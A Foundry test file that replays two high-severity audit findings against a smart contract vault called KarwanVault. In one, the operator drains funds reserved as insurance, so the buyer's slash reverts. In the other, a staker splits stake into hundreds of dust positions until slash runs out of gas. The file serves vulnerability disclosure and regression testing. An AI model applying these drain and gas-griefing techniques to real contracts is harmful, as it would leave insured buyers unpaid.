// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {KarwanVault} from "../src/KarwanVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Minimal ERC-20 mock (mirrors KarwanVault.t.sol's MockUSDC).
contract MockUSDC is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "INSUFFICIENT");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(allowance[from][msg.sender] >= amount, "ALLOWANCE");
        require(balanceOf[from] >= amount, "INSUFFICIENT");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @title H-2 + H-3 attack replays (KarwanVault, pre-v2)
/// @notice Two HIGH findings, each proven against v1 so Vault v2 has a red
///         baseline. Both tests are expected to PASS on the current contract:
///         they demonstrate the vulnerability, not the fix.
///
///         H-2: withdrawForYield can send out USDC that reservations depend on,
///              because it only checks the raw balance, not balance minus
///              reserved. A drained vault then makes slash revert, silently
///              killing the insurance backstop.
///         H-3: MIN_PRINCIPAL is 1 USDC, so a seller fragments stake into
///              thousands of dust positions; slash walks them linearly and
///              runs out of gas, so the buyer's insurance slash never lands.
contract KarwanVaultH2H3AttackTest is Test {
    KarwanVault vault;
    MockUSDC usdc;

    address staker = makeAddr("staker");
    address escrow = makeAddr("escrow");
    address operator; // the vault owner/operator is the deployer (this test)
    address buyer = makeAddr("buyer"); // slash beneficiary (insured party)

    uint256 constant ONE_USDC = 1e6;

    function setUp() public {
        usdc = new MockUSDC();
        vault = new KarwanVault(address(usdc));
        vault.setEscrow(escrow);
        operator = address(this); // deployer is operator in the current design
        usdc.mint(staker, 2_000 * ONE_USDC);
    }

    function _depositAs(address who, uint256 amount) internal returns (uint256) {
        vm.startPrank(who);
        usdc.approve(address(vault), amount);
        uint256 id = vault.deposit(amount);
        vm.stopPrank();
        return id;
    }

    /* ------------------------------------------------------------------ H-2 */

    /// PROOF: the operator can withdraw funds that are reserved as insurance,
    /// after which the slash that should pay the buyer reverts. Expected PASS
    /// on v1. Vault v2's coverage check makes the withdraw revert instead.
    function test_H2_YieldWithdrawDrainsReservedInsurance() public {
        // Staker posts 100 USDC of insurance stake.
        _depositAs(staker, 100 * ONE_USDC);

        // A deal reserves the full 100 against the staker.
        bytes32 jobId = keccak256("insured-deal");
        vm.prank(escrow);
        vault.reserve(jobId, staker, 100 * ONE_USDC);
        assertEq(vault.reservedTotal(staker), 100 * ONE_USDC, "reserved");

        // BUG: the operator withdraws the reserved USDC for "yield". The
        // docstring promises only funds above reservedTotal can leave; the
        // code only checks the raw balance, so this succeeds and drains the
        // insurance backing.
        vault.withdrawForYield(100 * ONE_USDC);
        assertEq(usdc.balanceOf(address(vault)), 0, "vault drained below reserved");

        // CONSEQUENCE: the buyer's insurance slash now reverts. The backstop
        // is silently dead; on-chain the escrow's try/catch swallows this and
        // the buyer is left uninsured.
        vm.prank(escrow);
        vm.expectRevert(); // MockUSDC "INSUFFICIENT" on the payout transfer
        vault.slash(jobId, buyer);
    }

    /* ------------------------------------------------------------------ H-3 */

    /// PROOF: MIN_PRINCIPAL permits dust, and slash cost scales with position
    /// count without bound, so a griefing seller can push slash past any gas
    /// stipend. Expected PASS on v1. Vault v2 caps positions + tracks an O(1)
    /// aggregate so slash stays bounded.
    function test_H3_SlashGriefedByDustPositions() public {
        // MIN_PRINCIPAL is 1 USDC: dust staking is allowed.
        assertEq(vault.MIN_PRINCIPAL(), 1 * ONE_USDC, "dust minimum");

        // The seller fragments stake into many 1-USDC positions. 600 is well
        // within what an attacker would open; the point is it is unbounded.
        uint256 n = 600;
        vm.startPrank(staker);
        usdc.approve(address(vault), n * ONE_USDC);
        for (uint256 i = 0; i < n; i++) {
            vault.deposit(1 * ONE_USDC);
        }
        vm.stopPrank();

        // A deal reserves the whole fragmented stake.
        bytes32 jobId = keccak256("griefed-deal");
        vm.prank(escrow);
        vault.reserve(jobId, staker, n * ONE_USDC);

        // slash must walk every dust position to cover the reservation. Under
        // a bounded gas stipend (what escrow.refund realistically forwards to
        // a try/catch call), it runs out of gas and reverts, so the insurance
        // never pays. 800k gas is generous for a single insurance payout yet
        // nowhere near enough to walk 600 positions.
        vm.prank(escrow);
        (bool ok,) = address(vault).call{gas: 800_000}(
            abi.encodeWithSelector(vault.slash.selector, jobId, buyer)
        );
        assertFalse(ok, "slash griefed: ran out of gas walking dust positions");
    }

    /// CONTROL: the same slash with a handful of positions succeeds, proving
    /// the H-3 failure is the position count, not the mechanism.
    function test_H3_Control_SmallPositionCountSucceeds() public {
        uint256 n = 5;
        vm.startPrank(staker);
        usdc.approve(address(vault), n * ONE_USDC);
        for (uint256 i = 0; i < n; i++) {
            vault.deposit(1 * ONE_USDC);
        }
        vm.stopPrank();

        bytes32 jobId = keccak256("normal-deal");
        vm.prank(escrow);
        vault.reserve(jobId, staker, n * ONE_USDC);

        vm.prank(escrow);
        (bool ok,) = address(vault).call{gas: 800_000}(
            abi.encodeWithSelector(vault.slash.selector, jobId, buyer)
        );
        assertTrue(ok, "slash lands fine at low position count");
        assertEq(usdc.balanceOf(buyer), n * ONE_USDC, "buyer insured");
    }
}
